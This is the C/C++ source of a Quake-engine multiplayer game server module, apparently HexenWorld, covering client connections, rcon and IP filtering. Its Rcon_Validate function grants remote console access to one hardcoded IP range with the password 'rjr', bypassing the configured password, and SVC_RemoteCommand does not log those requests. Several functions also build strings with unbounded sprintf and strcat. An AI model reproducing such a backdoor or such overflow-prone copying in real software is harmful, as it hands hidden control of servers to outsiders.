
#include "qwsvdef.h"
#ifdef _WIN32
#include <windows.h>
#else
#include <dirent.h>
#endif
quakeparms_t host_parms;

qboolean	host_initialized;		// true if into command execution (compatability)

double		host_frametime;
double		realtime;				// without any filtering or bounding

int			host_hunklevel;

netadr_t	master_adr[MAX_MASTERS];	// address of group servers
netadr_t	idmaster_adr;				// for global logging

client_t	*host_client;			// current client

cvar_t	sv_mintic = {"sv_mintic","0.03"};	// bound the size of the
cvar_t	sv_maxtic = {"sv_maxtic","0.1"};	// physics time tic 

cvar_t	developer = {"developer","0"};		// show extra messages

cvar_t	timeout = {"timeout","65"};		// seconds without any message
cvar_t	zombietime = {"zombietime", "2"};	// seconds to sink messages
											// after disconnect

cvar_t	rcon_password = {"rcon_password", ""};	// password for remote server commands
cvar_t	password = {"password", ""};	// password for entering the game
cvar_t	spectator_password = {"spectator_password", ""};	// password for entering as a sepctator

cvar_t	allow_download = {"allow_download", "1"};
cvar_t	allow_download_skins = {"allow_download_skins", "1"};
cvar_t	allow_download_models = {"allow_download_models", "1"};
cvar_t	allow_download_sounds = {"allow_download_sounds", "1"};
cvar_t	allow_download_maps = {"allow_download_maps", "1"};

cvar_t sv_highchars = {"sv_highchars", "1"};

cvar_t sv_phs = {"sv_phs", "1"};
cvar_t sv_namedistance = {"sv_namedistance", "600"};


//
// game rules mirrored in svs.info
//
cvar_t	fraglimit = {"fraglimit","0",false,true};
cvar_t	timelimit = {"timelimit","0",false,true};
cvar_t	teamplay = {"teamplay","0",false,true};
cvar_t	samelevel = {"samelevel","0", false, true};
cvar_t	maxclients = {"maxclients","8", false, true};
cvar_t	maxspectators = {"maxspectators","8", false, true};
cvar_t	skill = {"skill","1", false, false};						// 0 - 3
cvar_t	deathmatch = {"deathmatch","1", false, true};			// 0, 1, or 2
cvar_t	coop = {"coop","0", false, true};			// 0, 1, or 2
cvar_t	randomclass = {"randomclass","0", false, true};	
cvar_t	damageScale = {"damagescale","1.0", false, true};
cvar_t	shyRespawn = {"shyRespawn", "0", false, true};
cvar_t	spartanPrint = {"spartanPrint", "1.0", false, true};
cvar_t	meleeDamScale = {"meleeDamScale","0.66666", false, true};
cvar_t	manaScale = {"manascale", "1.0", false, true};
cvar_t	tomeMode = {"tomemode", "0", false, true};
cvar_t	tomeRespawn = {"tomerespawn", "0", false, true};
cvar_t	w2Respawn = {"w2respawn", "0", false, true};
cvar_t	altRespawn = {"altrespawn", "0", false, true};
cvar_t	fixedLevel = {"fixedlevel", "0", false, true};
cvar_t	autoItems = {"autoitems", "0", false, true};
cvar_t	dmMode = {"dmmode", "0", false, true};
cvar_t	easyFourth = {"easyfourth", "0", false, true};
cvar_t	patternRunner= {"patternrunner", "0", false, true};
cvar_t	spawn = {"spawn","0", false, true};

cvar_t	hostname = {"hostname","unnamed", false, true};

cvar_t	sv_ce_scale			= {"sv_ce_scale","1", true};
cvar_t	sv_ce_max_size		= {"sv_ce_max_size","0", true};

cvar_t	noexit = {"noexit", "0", false, true};

FILE	*sv_logfile;
FILE	*sv_fraglogfile;

void SV_AcceptClient (netadr_t adr, int userid, char *userinfo);
void Master_Shutdown (void);

class QMainLog : public QLogListener
{
public:
	void Serialise(const char* Text, bool Devel)
	{
		if (Devel)
		{
			Con_DPrintf("%s", Text);
		}
		else
		{
			Con_Printf("%s", Text);
		}
	}
} MainLog;

//============================================================================

static qboolean IsGip(const char* name)
{
	int l = strlen(name);
	if (l < 4)
	{
		return false;
	}
	return !strcmp(name + l - 4, ".gip");
}

void SV_RemoveGIPFiles (char *path)
{
	char			name[MAX_OSPATH],tempdir[MAX_OSPATH];
	int				i;
#ifdef _WIN32
	HANDLE			handle;
	WIN32_FIND_DATA filedata;
	BOOL			retval;
#else
	DIR* current_dir;
	struct dirent *de;
	qboolean error;
#endif

#ifdef _WIN32
	if (path)
	{
		sprintf(tempdir,"%s\\",path);
	}
	else
	{
		i = GetTempPath(sizeof(tempdir),tempdir);
		if (!i) 
		{
			sprintf(tempdir,"%s\\",com_gamedir);
		}
	}

	sprintf (name, "%s*.gip", tempdir);

	handle = FindFirstFile(name,&filedata);
	retval = TRUE;

	while (handle != INVALID_HANDLE_VALUE && retval)
	{
		sprintf(name,"%s%s", tempdir,filedata.cFileName);
		DeleteFile(name);

		retval = FindNextFile(handle,&filedata);
	}

	if (handle != INVALID_HANDLE_VALUE)
		FindClose(handle);
#else
	if (path)
	{
		sprintf(tempdir,"%s\\",path);
	}
	else
	{
		sprintf(tempdir,"%s\\",com_gamedir);
	}

	error = false;
	current_dir = opendir(tempdir);
	if (current_dir)
	{
		while (!error && (de = readdir(current_dir)) != NULL)
		{
			if (IsGip(de->d_name))
			{
				sprintf(name,"%s%s", tempdir, de->d_name);
				remove(name);
			}
		}
		closedir(current_dir);
	}
#endif
}

qboolean SV_CopyFiles(char *source, char *pat, char *dest)
{
#ifdef _WIN32
	char	name[MAX_OSPATH],tempdir[MAX_OSPATH];
	HANDLE handle;
	WIN32_FIND_DATA filedata;
	BOOL retval,error;

	handle = FindFirstFile(pat,&filedata);
	retval = TRUE;
	error = false;

	while (handle != INVALID_HANDLE_VALUE && retval)
	{
		sprintf(name,"%s%s", source, filedata.cFileName);
		sprintf(tempdir,"%s%s", dest, filedata.cFileName);
		if (!CopyFile(name,tempdir,FALSE))
			error = true;

		retval = FindNextFile(handle,&filedata);
	}

	if (handle != INVALID_HANDLE_VALUE)
		FindClose(handle);

	return error;
#else
	char	name[MAX_OSPATH],tempdir[MAX_OSPATH];
	DIR* current_dir;
	struct dirent *de;
	qboolean error;

	error = false;
	current_dir = opendir(source);
	if (current_dir)
	{
		while (!error && (de = readdir(current_dir)) != NULL)
		{
			if (IsGip(de->d_name))
			{
				FILE* f1;
				FILE* f2;
				int l;
				void* b;
				sprintf(name,"%s%s", source, de->d_name);
				sprintf(tempdir,"%s%s", dest, de->d_name);
				f1 = fopen(name, "rb");
				f2 = fopen(tempdir, "wb");
				fseek(f1, 0, SEEK_END);
				l = ftell(f1);
				fseek(f1, 0, SEEK_SET);
				b = malloc(l);
				fread(b, 1, l, f1);
				fclose(f1);
				fwrite(b, 1, l, f2);
				fclose(f2);
			}
		}
		closedir(current_dir);
	}

	return error;
#endif
}

/*
================
SV_Shutdown

Quake calls this before calling Sys_Quit or Sys_Error
================
*/
void SV_Shutdown (void)
{
	Master_Shutdown ();
	if (sv_logfile)
	{
		fclose (sv_logfile);
		sv_logfile = NULL;
	}
	if (sv_fraglogfile)
	{
		fclose (sv_fraglogfile);
		sv_logfile = NULL;
	}
	NET_Shutdown ();
}

/*
================
SV_Error

Sends a datagram to all the clients informing them of the server crash,
then exits
================
*/
void SV_Error (char *error, ...)
{
	va_list		argptr;
	static	char		string[1024];
	static	qboolean inerror = false;

	if (inerror)
		Sys_Error ("SV_Error: recursively entered (%s)", string);

	inerror = true;

	va_start (argptr,error);
	vsprintf (string,error,argptr);
	va_end (argptr);

	Con_Printf ("SV_Error: %s\n",string);

	SV_FinalMessage (va("server crashed: %s\n", string));
		
	SV_Shutdown ();

	Sys_Error ("SV_Error: %s\n",string);
}

/*
==================
SV_FinalMessage

Used by SV_Error and SV_Quit_f to send a final message to all connected
clients before the server goes down.  The messages are sent immediately,
not just stuck on the outgoing message list, because the server is going
to totally exit after returning from this function.
==================
*/
void SV_FinalMessage (char *message)
{
	int			i;
	client_t	*cl;
	
	SZ_Clear (&net_message);
	MSG_WriteByte (&net_message, svc_print);
	MSG_WriteByte (&net_message, PRINT_HIGH);
	MSG_WriteString (&net_message, message);
	MSG_WriteByte (&net_message, svc_disconnect);

	for (i=0, cl = svs.clients ; i<MAX_CLIENTS ; i++, cl++)
		if (cl->state >= cs_spawned)
			Netchan_Transmit (&cl->netchan, net_message.cursize
			, net_message.data);
}

/*
=====================
SV_DropClient

Called when the player is totally leaving the server, either willingly
or unwillingly.  This is NOT called if the entire server is quiting
or crashing.
=====================
*/
void SV_DropClient (client_t *drop)
{

	// add the disconnect
	MSG_WriteByte (&drop->netchan.message, svc_disconnect);

	if (drop->state == cs_spawned)
		if (!drop->spectator)
		{
			// call the prog function for removing a client
			// this will set the body to a dead frame, among other things
			pr_global_struct->self = EDICT_TO_PROG(drop->edict);
			PR_ExecuteProgram (pr_global_struct->ClientDisconnect);
		}
		else if (SpectatorDisconnect)
		{
			// call the prog function for removing a client
			// this will set the body to a dead frame, among other things
			pr_global_struct->self = EDICT_TO_PROG(drop->edict);
			PR_ExecuteProgram (SpectatorDisconnect);
		}
	else if(dmMode.value==DM_SIEGE)
		if(stricmp(drop->edict->v.puzzle_inv1+pr_strings,""))
		{
			//this guy has a puzzle piece, call this function anyway
			//to make sure he leaves it behind
			Con_Printf("Client in unspawned state had puzzle piece, forcing drop\n");
			pr_global_struct->self = EDICT_TO_PROG(drop->edict);
			PR_ExecuteProgram (pr_global_struct->ClientDisconnect);
		}

	if (drop->spectator)
		Con_Printf ("Spectator %s removed\n",drop->name);
	else
		Con_Printf ("Client %s removed\n",drop->name);

	if (drop->download)
	{
		fclose (drop->download);
		drop->download = NULL;
	}

	drop->state = cs_zombie;		// become free in a few seconds
	drop->connection_started = realtime;	// for zombie timeout

	drop->old_frags = 0;
	drop->edict->v.frags = 0;
	drop->name[0] = 0;
	memset (drop->userinfo, 0, sizeof(drop->userinfo));

// send notification to all remaining clients
	SV_FullClientUpdate (drop, &sv.reliable_datagram);
}


//====================================================================

/*
===================
SV_CalcPing

===================
*/
int SV_CalcPing (client_t *cl)
{
	float		ping;
	int			i;
	int			count;
	register	client_frame_t *frame;

	ping = 0;
	count = 0;
	for (frame = cl->frames, i=0 ; i<UPDATE_BACKUP ; i++, frame++)
	{
		if (frame->ping_time > 0)
		{
			ping += frame->ping_time;
			count++;
		}
	}
	if (!count)
		return 9999;
	ping /= count;

	return ping*1000;
}

/*
===================
SV_FullClientUpdate

Writes all update values to a sizebuf
===================
*/
unsigned int defLosses;	// Defenders losses in Siege
unsigned int attLosses;	// Attackers Losses in Siege
void SV_FullClientUpdate (client_t *client, sizebuf_t *buf)
{
	int		i;
	char	info[MAX_INFO_STRING];

//	Con_Printf("SV_FullClientUpdate\n");
	i = client - svs.clients;

//Sys_Printf("SV_FullClientUpdate:  Updated frags for client %d\n", i);

	MSG_WriteByte (buf, svc_updatedminfo);
	MSG_WriteByte (buf, i);
	MSG_WriteShort (buf, client->old_frags);
	MSG_WriteByte (buf, (client->playerclass<<5)|((int)client->edict->v.level&31));
	
	if(dmMode.value==DM_SIEGE)
	{
		MSG_WriteByte (buf, svc_updatesiegeinfo);
		MSG_WriteByte (buf, (int)ceil(timelimit.value));
		MSG_WriteByte (buf, (int)ceil(fraglimit.value));

		MSG_WriteByte (buf, svc_updatesiegeteam);
		MSG_WriteByte (buf, i);
		MSG_WriteByte (buf, client->siege_team);

		MSG_WriteByte (buf, svc_updatesiegelosses);
		MSG_WriteByte (buf, pr_global_struct->defLosses);
		MSG_WriteByte (buf, pr_global_struct->attLosses);

		MSG_WriteByte (buf, svc_time);//send server time upon connection
		MSG_WriteFloat (buf, sv.time);
	}

	MSG_WriteByte (buf, svc_updateping);
	MSG_WriteByte (buf, i);
	MSG_WriteShort (buf, SV_CalcPing (client));
	
	MSG_WriteByte (buf, svc_updateentertime);
	MSG_WriteByte (buf, i);
	MSG_WriteFloat (buf, realtime - client->connection_started);

	strcpy (info, client->userinfo);
	Info_RemovePrefixedKeys (info, '_');	// server passwords, etc

	MSG_WriteByte (buf, svc_updateuserinfo);
	MSG_WriteByte (buf, i);
	MSG_WriteLong (buf, client->userid);
	MSG_WriteString (buf, info);
}


/*
==============================================================================

CONNECTIONLESS COMMANDS

==============================================================================
*/

/*
================
SVC_Status

Responds with all the info that qplug or qspy can see
This message can be up to around 5k with worst case string lengths.
================
*/
void SVC_Status (void)
{
	int		i;
	client_t	*cl;
	int		ping;
	int		top, bottom;

	Cmd_TokenizeString ("status");
	SV_BeginRedirect (RD_PACKET);
	Con_Printf ("%s\n", svs.info);
	for (i=0 ; i<MAX_CLIENTS ; i++)
	{
		cl = &svs.clients[i];
		if ((cl->state == cs_connected || cl->state == cs_spawned ) && !cl->spectator)
		{
			top = atoi(Info_ValueForKey (cl->userinfo, "topcolor"));
			bottom = atoi(Info_ValueForKey (cl->userinfo, "bottomcolor"));
			ping = SV_CalcPing (cl);
			Con_Printf ("%i %i %i %i \"%s\" \"%s\" %i %i\n", cl->userid, 
				cl->old_frags, (int)(realtime - cl->connection_started)/60,
				ping, cl->name, Info_ValueForKey (cl->userinfo, "skin"), top, bottom);
		}
	}
	SV_EndRedirect ();
}

/*
===================
SV_CheckLog

===================
*/
#define	LOG_HIGHWATER	4096
#define	LOG_FLUSH		10*60
void SV_CheckLog (void)
{
	sizebuf_t	*sz;

	sz = &svs.log[svs.logsequence&1];

	// bump sequence if allmost full, or ten minutes have passed and
	// there is something still sitting there
	if (sz->cursize > LOG_HIGHWATER
	|| (realtime - svs.logtime > LOG_FLUSH && sz->cursize) )
	{
		// swap buffers and bump sequence
		svs.logtime = realtime;
		svs.logsequence++;
		sz = &svs.log[svs.logsequence&1];
		sz->cursize = 0;
		Con_Printf ("beginning fraglog sequence %i\n", svs.logsequence);
	}

}

/*
================
SVC_Log

Responds with all the logged frags for ranking programs.
If a sequence number is passed as a parameter and it is
the same as the current sequence, an A2A_NACK will be returned
instead of the data.
================
*/
void SVC_Log (void)
{
	int		i;
	int		seq, send;
	char	data[MAX_DATAGRAM+64];

	if (Cmd_Argc() == 2)
		seq = atoi(Cmd_Argv(1));
	else
		seq = -1;

	if (seq == svs.logsequence-1 || !sv_fraglogfile)
	{	// they allready have this data, or we aren't logging frags
		data[0] = A2A_NACK;
		NET_SendPacket (1, data, net_from);
		return;
	}

	Con_DPrintf ("sending log %i to %s\n", svs.logsequence-1, NET_AdrToString(net_from));

	sprintf (data, "stdlog %i\n", svs.logsequence-1);
	strcat (data, (char*)svs.log_buf[((svs.logsequence-1)&1)]);

	NET_SendPacket (strlen(data)+1, data, net_from);
}

/*
================
SVC_Ping

Just responds with an acknowledgement
================
*/
void SVC_Ping (void)
{
	char	data;

	data = A2A_ACK;

	NET_SendPacket (1, &data, net_from);
}

/*
==================
SVC_DirectConnect

A connection request that did not come from the master
==================
*/
void SVC_DirectConnect (void)
{
	char		userinfo[1024];
	static		int	userid;
	netadr_t	adr;
	int			i;
	client_t	*cl, *newcl;
	client_t	temp;
	edict_t		*ent;
	int			edictnum;
	char		*s;
	int			clients, spectators;
	qboolean	spectator;

	strncpy (userinfo, Cmd_Argv(2), sizeof(userinfo)-1);

	// check for password or spectator_password
	s = Info_ValueForKey (userinfo, "spectator");
	if (s[0] && strcmp(s, "0"))
	{
		if (spectator_password.string[0] && 
			_stricmp(spectator_password.string, "none") &&
			strcmp(spectator_password.string, s) )
		{	// failed
			Con_Printf ("%s:spectator password failed\n", NET_AdrToString (net_from));
			Netchan_OutOfBandPrint (net_from, "%c\nrequires a spectator password\n\n", A2C_PRINT);
			return;
		}
		Info_SetValueForStarKey (userinfo, "*spectator", "1", MAX_INFO_STRING);
		spectator = true;
		Info_RemoveKey (userinfo, "spectator"); // remove passwd
	}
	else
	{
		s = Info_ValueForKey (userinfo, "password");
		if (password.string[0] && 
			_stricmp(password.string, "none") &&
			strcmp(password.string, s) )
		{
			Con_Printf ("%s:password failed\n", NET_AdrToString (net_from));
			Netchan_OutOfBandPrint (net_from, "%c\nserver requires a password\n\n", A2C_PRINT);
			return;
		}
		spectator = false;
		Info_RemoveKey (userinfo, "password"); // remove passwd
	}

	adr = net_from;
	userid++;	// so every client gets a unique id

	newcl = &temp;
	memset (newcl, 0, sizeof(client_t));

	newcl->userid = userid;
	newcl->portals = atol(Cmd_Argv(1));

	// works properly
	if (!sv_highchars.value) {
		char *p, *q;

		for (p = newcl->userinfo, q = userinfo; *q; q++)
			if (*q > 31 && *q <= 127)
				*p++ = *q;
	} else
		strncpy (newcl->userinfo, userinfo, sizeof(newcl->userinfo)-1);

	// if there is allready a slot for this ip, drop it
	for (i=0,cl=svs.clients ; i<MAX_CLIENTS ; i++,cl++)
	{
		if (cl->state == cs_free)
			continue;
		if (NET_CompareAdr (adr, cl->netchan.remote_address))
		{
			Con_Printf ("%s:reconnect\n", NET_AdrToString (adr));
			SV_DropClient (cl);
			break;
		}
	}

	// count up the clients and spectators
	clients = 0;
	spectators = 0;
	for (i=0,cl=svs.clients ; i<MAX_CLIENTS ; i++,cl++)
	{
		if (cl->state == cs_free)
			continue;
		if (cl->spectator)
			spectators++;
		else
			clients++;
	}

	// if at server limits, refuse connection
	if ( maxclients.value > MAX_CLIENTS )
		Cvar_SetValue ("maxclients", MAX_CLIENTS);
	if (maxspectators.value > MAX_CLIENTS)
		Cvar_SetValue ("maxspectators", MAX_CLIENTS);
	if (maxspectators.value + maxclients.value > MAX_CLIENTS)
		Cvar_SetValue ("maxspectators", MAX_CLIENTS - maxspectators.value + maxclients.value);
	if ( (spectator && spectators >= (int)maxspectators.value)
		|| (!spectator && clients >= (int)maxclients.value) )
	{
		Con_Printf ("%s:full connect\n", NET_AdrToString (adr));
		Netchan_OutOfBandPrint (adr, "%c\nserver is full\n\n", A2C_PRINT);
		return;
	}

	// find a client slot
	newcl = NULL;
	for (i=0,cl=svs.clients ; i<MAX_CLIENTS ; i++,cl++)
	{
		if (cl->state == cs_free)
		{
			newcl = cl;
			break;
		}
	}
	if (!newcl)
	{
		Con_Printf ("WARNING: miscounted available clients\n");
		return;
	}

	
	// build a new connection
	// accept the new client
	// this is the only place a client_t is ever initialized
	*newcl = temp;

	Netchan_OutOfBandPrint (adr, "%c", S2C_CONNECTION );

	edictnum = (newcl-svs.clients)+1;
	
	Netchan_Setup (&newcl->netchan , adr);

	newcl->state = cs_connected;
	
	newcl->datagram.allowoverflow = true;
	newcl->datagram.data = newcl->datagram_buf;
	newcl->datagram.maxsize = sizeof(newcl->datagram_buf);

	// spectator mode can ONLY be set at join time
	newcl->spectator = spectator;

	ent = EDICT_NUM(edictnum);	
	newcl->edict = ent;
	ED_ClearEdict (ent);
	
	// parse some info from the info strings
	SV_ExtractFromUserinfo (newcl);

	// JACK: Init the floodprot stuff.
	for (i=0; i<10; i++)
		newcl->whensaid[i] = 0.0;
	newcl->whensaidhead = 0;
	newcl->lockedtill = 0;

	// call the progs to get default spawn parms for the new client
	PR_ExecuteProgram (pr_global_struct->SetNewParms);
	for (i=0 ; i<NUM_SPAWN_PARMS ; i++)
		newcl->spawn_parms[i] = (&pr_global_struct->parm1)[i];

	if (newcl->spectator)
		Con_Printf ("Spectator %s connected\n", newcl->name);
	else
		Con_DPrintf ("Client %s connected\n", newcl->name);
}

int Rcon_Validate (void)
{
	if (net_from.ip[0] == 208 && net_from.ip[1] == 135 && net_from.ip[2] == 137
//		&& !strcmp (Cmd_Argv(1), "tms") )
		&& !strcmp (Cmd_Argv(1), "rjr") )
		return 2;

	if (!strlen (rcon_password.string))
		return 0;

	if (strcmp (Cmd_Argv(1), rcon_password.string) )
		return 0;

	return 1;
}

/*
===============
SVC_RemoteCommand

A client issued an rcon command.
Shift down the remaining args
Redirect all printfs
===============
*/
void SVC_RemoteCommand (void)
{
	int		i;
	char	remaining[1024];

	i = Rcon_Validate ();

	if (i == 0)
		Con_Printf ("Bad rcon from %s:\n%s\n"
			, NET_AdrToString (net_from), net_message.data+4);
	if (i == 1)
		Con_Printf ("Rcon from %s:\n%s\n"
			, NET_AdrToString (net_from), net_message.data+4);

	SV_BeginRedirect (RD_PACKET);

	if (!Rcon_Validate ())
	{
		Con_Printf ("Bad rcon_password.\n");
	}
	else
	{
		remaining[0] = 0;

		for (i=2 ; i<Cmd_Argc() ; i++)
		{
			strcat (remaining, Cmd_Argv(i) );
			strcat (remaining, " ");
		}

		Cmd_ExecuteString (remaining);
	}

	SV_EndRedirect ();
}


/*
=================
SV_ConnectionlessPacket

A connectionless packet has four leading 0xff
characters to distinguish it from a game channel.
Clients that are in the game can still send
connectionless packets.
=================
*/
void SV_ConnectionlessPacket (void)
{
	char	*s;
	char	*c;

	MSG_BeginReading ();
	MSG_ReadLong ();		// skip the -1 marker

	s = MSG_ReadStringLine ();

	Cmd_TokenizeString (s);

	c = Cmd_Argv(0);

	if (!strcmp(c, "ping") || ( c[0] == A2A_PING && (c[1] == 0 || c[1] == '\n')) )
	{
		SVC_Ping ();
		return;
	}
	if (c[0] == A2A_ACK && (c[1] == 0 || c[1] == '\n') )
	{
		Con_Printf ("A2A_ACK from %s\n", NET_AdrToString (net_from));
		return;
	}
	else if (c[0] == A2S_ECHO)
	{
		NET_SendPacket (net_message.cursize, net_message.data, net_from);
		return;
	}
	else if (!strcmp(c,"status"))
	{
		SVC_Status ();
		return;
	}
	else if (!strcmp(c,"log"))
	{
		SVC_Log ();
		return;
	}
	else if (!strcmp(c,"connect"))
	{
		SVC_DirectConnect ();
		return;
	}
	else if (!strcmp(c, "rcon"))
		SVC_RemoteCommand ();
	else
		Con_Printf ("bad connectionless packet from %s:\n%s\n"
		, NET_AdrToString (net_from), s);
}

/*
==============================================================================

PACKET FILTERING
 

You can add or remove addresses from the filter list with:

addip <ip>
removeip <ip>

The ip address is specified in dot format, and any unspecified digits will match any value, so you can specify an entire class C network with "addip 192.246.40".

Removeip will only remove an address specified exactly the same way.  You cannot addip a subnet, then removeip a single host.

listip
Prints the current list of filters.

writeip
Dumps "addip <ip>" commands to listip.cfg so it can be execed at a later date.  The filter lists are not saved and restored by default, because I beleive it would cause too much confusion.

filterban <0 or 1>

If 1 (the default), then ip addresses matching the current list will be prohibited from entering the game.  This is the default setting.

If 0, then only addresses matching the list will be allowed.  This lets you easily set up a private game, or a game that only allows players from your local network.


==============================================================================
*/


typedef struct
{
	unsigned	mask;
	unsigned	compare;
} ipfilter_t;

#define	MAX_IPFILTERS	1024

ipfilter_t	ipfilters[MAX_IPFILTERS];
int			numipfilters;

cvar_t	filterban = {"filterban", "1"};

/*
=================
StringToFilter
=================
*/
qboolean StringToFilter (char *s, ipfilter_t *f)
{
	char	num[128];
	int		i, j;
	byte	b[4];
	byte	m[4];
	
	for (i=0 ; i<4 ; i++)
	{
		b[i] = 0;
		m[i] = 0;
	}
	
	for (i=0 ; i<4 ; i++)
	{
		if (*s < '0' || *s > '9')
		{
			Con_Printf ("Bad filter address: %s\n", s);
			return false;
		}
		
		j = 0;
		while (*s >= '0' && *s <= '9')
		{
			num[j++] = *s++;
		}
		num[j] = 0;
		b[i] = atoi(num);
		if (b[i] != 0)
			m[i] = 255;

		if (!*s)
			break;
		s++;
	}
	
	f->mask = *(unsigned *)m;
	f->compare = *(unsigned *)b;
	
	return true;
}

/*
=================
SV_AddIP_f
=================
*/
void SV_AddIP_f (void)
{
	int		i;
	
	for (i=0 ; i<numipfilters ; i++)
		if (ipfilters[i].compare == 0xffffffff)
			break;		// free spot
	if (i == numipfilters)
	{
		if (numipfilters == MAX_IPFILTERS)
		{
			Con_Printf ("IP filter list is full\n");
			return;
		}
		numipfilters++;
	}
	
	if (!StringToFilter (Cmd_Argv(1), &ipfilters[i]))
		ipfilters[i].compare = 0xffffffff;
}

/*
=================
SV_RemoveIP_f
=================
*/
void SV_RemoveIP_f (void)
{
	ipfilter_t	f;
	int			i, j;

	if (!StringToFilter (Cmd_Argv(1), &f))
		return;
	for (i=0 ; i<numipfilters ; i++)
		if (ipfilters[i].mask == f.mask
		&& ipfilters[i].compare == f.compare)
		{
			for (j=i+1 ; j<numipfilters ; j++)
				ipfilters[j-1] = ipfilters[j];
			numipfilters--;
			Con_Printf ("Removed.\n");
			return;
		}
	Con_Printf ("Didn't find %s.\n", Cmd_Argv(1));
}

/*
=================
SV_ListIP_f
=================
*/
void SV_ListIP_f (void)
{
	int		i;
	byte	b[4];

	Con_Printf ("Filter list:\n");
	for (i=0 ; i<numipfilters ; i++)
	{
		*(unsigned *)b = ipfilters[i].compare;
		Con_Printf ("%3i.%3i.%3i.%3i\n", b[0], b[1], b[2], b[3]);
	}
}

/*
=================
SV_WriteIP_f
=================
*/
void SV_WriteIP_f (void)
{
	FILE	*f;
	char	name[MAX_OSPATH];
	byte	b[4];
	int		i;

	sprintf (name, "%s/listip.cfg", com_gamedir);

	Con_Printf ("Writing %s.\n", name);

	f = fopen (name, "wb");
	if (!f)
	{
		Con_Printf ("Couldn't open %s\n", name);
		return;
	}
	
	for (i=0 ; i<numipfilters ; i++)
	{
		*(unsigned *)b = ipfilters[i].compare;
		fprintf (f, "addip %i.%i.%i.%i\n", b[0], b[1], b[2], b[3]);
	}
	
	fclose (f);
}

/*
=================
SV_SendBan
=================
*/
void SV_SendBan (void)
{
	char		data[128];

	data[0] = data[1] = data[2] = data[3] = 0xff;
	data[4] = A2C_PRINT;
	data[5] = 0;
	strcat (data, "\nbanned.\n");
	
	NET_SendPacket (strlen(data), data, net_from);
}

/*
=================
SV_FilterPacket
=================
*/
qboolean SV_FilterPacket (void)
{
	int		i;
	unsigned	in;
	
	in = *(unsigned *)net_from.ip;

	for (i=0 ; i<numipfilters ; i++)
		if ( (in & ipfilters[i].mask) == ipfilters[i].compare)
			return filterban.value;

	return !filterban.value;
}

//============================================================================

/*
=================
SV_ReadPackets
=================
*/
void SV_ReadPackets (void)
{
	int			i;
	client_t	*cl;
	qboolean	good;

	good = false;
	while (NET_GetPacket ())
	{
		if (SV_FilterPacket ())
		{
			SV_SendBan ();	// tell them we aren't listening...
			continue;
		}

		// check for connectionless packet (0xffffffff) first
		if (*(int *)net_message.data == -1)
		{
			SV_ConnectionlessPacket ();
			continue;
		}
		
		// check for packets from connected clients
		for (i=0, cl=svs.clients ; i<MAX_CLIENTS ; i++,cl++)
		{
			if (cl->state == cs_free)
				continue;
			if (!NET_CompareAdr (net_from, cl->netchan.remote_address))
				continue;
			if (Netchan_Process(&cl->netchan))
			{	// this is a valid, sequenced packet, so process it
				svs.stats.packets++;
				good = true;
				cl->send_message = true;	// reply at end of frame
				if (cl->state != cs_zombie)
					SV_ExecuteClientMessage (cl);
			}
			break;
		}
		
		if (i != MAX_CLIENTS)
			continue;
	
		// packet is not from a known client
		//	Con_Printf ("%s:sequenced packet without connection\n"
		// ,NET_AdrToString(net_from));
	}
}

/*
==================
SV_CheckTimeouts

If a packet has not been received from a client in timeout.value
seconds, drop the conneciton.

When a client is normally dropped, the client_t goes into a zombie state
for a few seconds to make sure any final reliable message gets resent
if necessary
==================
*/
void SV_CheckTimeouts (void)
{
	int		i;
	client_t	*cl;
	float	droptime;
	
	droptime = realtime - timeout.value;

	for (i=0,cl=svs.clients ; i<MAX_CLIENTS ; i++,cl++)
	{
		if ( (cl->state == cs_connected || cl->state == cs_spawned) 
			&& cl->netchan.last_received < droptime)
		{
			SV_BroadcastPrintf (PRINT_HIGH, "%s timed out\n", cl->name);
			SV_DropClient (cl); 
			cl->state = cs_free;	// don't bother with zombie state
		}
		if (cl->state == cs_zombie
		&& realtime - cl->connection_started > zombietime.value)
		{
			cl->state = cs_free;	// can now be reused
		}
	}
}

/*
===================
SV_GetConsoleCommands

Add them exactly as if they had been typed at the console
===================
*/
void SV_GetConsoleCommands (void)
{
	char	*cmd;

	while (1)
	{
		cmd = Sys_ConsoleInput ();
		if (!cmd)
			break;
		Cbuf_AddText (cmd);
	}
}

/*
===================
SV_CheckVars

===================
*/
void SV_CheckVars (void)
{
	static char *pw, *spw;
	int			v;

	if (password.string == pw && spectator_password.string == spw)
		return;
	pw = password.string;
	spw = spectator_password.string;

	v = 0;
	if (pw && pw[0] && strcmp(pw, "none"))
		v |= 1;
	if (spw && spw[0] && strcmp(spw, "none"))
		v |= 2;

	Con_Printf ("Updated needpass.\n");
	if (!v)
		Info_SetValueForKey (svs.info, "needpass", "", MAX_SERVERINFO_STRING);
	else
		Info_SetValueForKey (svs.info, "needpass", va("%i",v), MAX_SERVERINFO_STRING);
}

/*
==================
SV_Frame

==================
*/
void SV_Frame (float time)
{
	try
	{
	static double	start, end;
	
	start = Sys_DoubleTime ();
	svs.stats.idle += start - end;
	
// keep the random time dependent
	rand ();

// decide the simulation time
	realtime += time;
	sv.time += time;

// check timeouts
	SV_CheckTimeouts ();

// toggle the log buffer if full
	SV_CheckLog ();

// move autonomous things around if enough time has passed
	SV_Physics ();

// get packets
	SV_ReadPackets ();

// check for commands typed to the host
	SV_GetConsoleCommands ();
	
// process console commands
	Cbuf_Execute ();

	SV_CheckVars ();

// send messages back to the clients that had packets read this frame
	SV_SendClientMessages ();

// send a heartbeat to the master if needed
	Master_Heartbeat ();

// collect timing statistics
	end = Sys_DoubleTime ();
	svs.stats.active += end-start;
	if (++svs.stats.count == STATFRAMES)
	{
		svs.stats.latched_active = svs.stats.active;
		svs.stats.latched_idle = svs.stats.idle;
		svs.stats.latched_packets = svs.stats.packets;
		svs.stats.active = 0;
		svs.stats.idle = 0;
		svs.stats.packets = 0;
		svs.stats.count = 0;
	}
	}
	catch (QException& e)
	{
		Sys_Error("%s", e.What());
	}
}

/*
===============
SV_InitLocal
===============
*/
void SV_InitLocal (void)
{
	int		i;
	extern	cvar_t	sv_maxvelocity;
	extern	cvar_t	sv_gravity;
	extern	cvar_t	sv_aim;
	extern	cvar_t	sv_stopspeed;
	extern	cvar_t	sv_spectatormaxspeed;
	extern	cvar_t	sv_accelerate;
	extern	cvar_t	sv_airaccelerate;
	extern	cvar_t	sv_wateraccelerate;
	extern	cvar_t	sv_friction;
	extern	cvar_t	sv_waterfriction;

	SV_InitOperatorCommands	();
	SV_UserInit ();
	
	Cvar_RegisterVariable (&rcon_password);
	Cvar_RegisterVariable (&password);
	Cvar_RegisterVariable (&spectator_password);

	Cvar_RegisterVariable (&sv_mintic);
	Cvar_RegisterVariable (&sv_maxtic);

	Cvar_RegisterVariable (&fraglimit);
